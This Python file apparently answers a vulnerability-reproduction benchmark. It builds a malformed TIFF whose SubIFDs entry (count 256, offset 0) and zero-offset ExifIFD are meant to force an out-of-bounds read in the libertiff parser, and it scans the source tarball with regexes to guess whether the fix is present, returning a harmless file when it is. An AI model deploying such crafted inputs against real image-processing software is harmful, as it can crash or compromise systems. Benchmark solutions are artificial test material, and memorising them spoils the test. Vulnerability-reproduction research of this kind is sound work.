import io
import os
import re
import tarfile
import struct
from typing import List, Tuple


def _u16le(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _u32le(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _ifd_entry_le(tag: int, typ: int, count: int, value_or_offset_u32: int) -> bytes:
    return _u16le(tag) + _u16le(typ) + _u32le(count) + _u32le(value_or_offset_u32)


def _make_minimal_tiff_le(include_offline: bool) -> bytes:
    entries: List[Tuple[int, int, int, int]] = []

    TYPE_SHORT = 3
    TYPE_LONG = 4

    # Basic 1x1 uncompressed grayscale
    entries.append((256, TYPE_LONG, 1, 1))   # ImageWidth
    entries.append((257, TYPE_LONG, 1, 1))   # ImageLength
    entries.append((258, TYPE_SHORT, 1, 8))  # BitsPerSample = 8
    entries.append((259, TYPE_SHORT, 1, 1))  # Compression = None
    entries.append((262, TYPE_SHORT, 1, 1))  # Photometric = BlackIsZero
    # StripOffsets filled later
    entries.append((273, TYPE_LONG, 1, 0))   # StripOffsets
    entries.append((277, TYPE_SHORT, 1, 1))  # SamplesPerPixel = 1
    entries.append((278, TYPE_LONG, 1, 1))   # RowsPerStrip = 1
    entries.append((279, TYPE_LONG, 1, 1))   # StripByteCounts = 1
    entries.append((284, TYPE_SHORT, 1, 1))  # PlanarConfiguration = contiguous

    if include_offline:
        # Offline tag trigger(s)
        # SubIFDs (tag 330) as LONG array with value offset = 0.
        # Count chosen to force an out-of-bounds access if bounds checks are missing.
        entries.append((330, TYPE_LONG, 256, 0))     # SubIFDs: count=256, offset=0
        entries.append((34665, TYPE_LONG, 1, 0))     # ExifIFD: offset=0

    entries.sort(key=lambda x: x[0])
    num_entries = len(entries)

    header = b"II" + _u16le(42) + _u32le(8)

    ifd_size = 2 + num_entries * 12 + 4
    pixel_offset = 8 + ifd_size
    pixel_data = b"\x00"

    out = bytearray()
    out += header
    out += _u16le(num_entries)

    for tag, typ, count, value in entries:
        if tag == 273:  # StripOffsets
            value = pixel_offset
        if typ == 3 and count == 1:
            value_u32 = value & 0xFFFF
        else:
            value_u32 = value & 0xFFFFFFFF
        out += _ifd_entry_le(tag, typ, count, value_u32)

    out += _u32le(0)  # next IFD offset
    if len(out) < pixel_offset:
        out += b"\x00" * (pixel_offset - len(out))
    out += pixel_data
    return bytes(out)


def _looks_fixed(src_path: str) -> bool:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            candidates = []
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name.lower()
                if "libertiff" not in name:
                    continue
                if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".cxx") or
                        name.endswith(".h") or name.endswith(".hpp") or name.endswith(".hh") or name.endswith(".hxx") or
                        name.endswith(".rs")):
                    continue
                if m.size > 2_000_000:
                    continue
                candidates.append(m)

            patterns = [
                re.compile(r"\bvalue[_ ]?offset\b\s*==\s*0", re.IGNORECASE),
                re.compile(r"\boffline\b[^\n]{0,200}\boffset\b[^\n]{0,80}==\s*0", re.IGNORECASE),
                re.compile(r"\boffset\b[^\n]{0,80}==\s*0[^\n]{0,200}\boffline\b", re.IGNORECASE),
            ]

            for m in candidates:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
                if not data:
                    continue
                try:
                    text = data.decode("utf-8", "ignore")
                except Exception:
                    text = data.decode("latin1", "ignore")
                for pat in patterns:
                    if pat.search(text):
                        return True
    except Exception:
        return False
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        fixed = _looks_fixed(src_path)
        if fixed:
            return _make_minimal_tiff_le(include_offline=False)
        return _make_minimal_tiff_le(include_offline=True)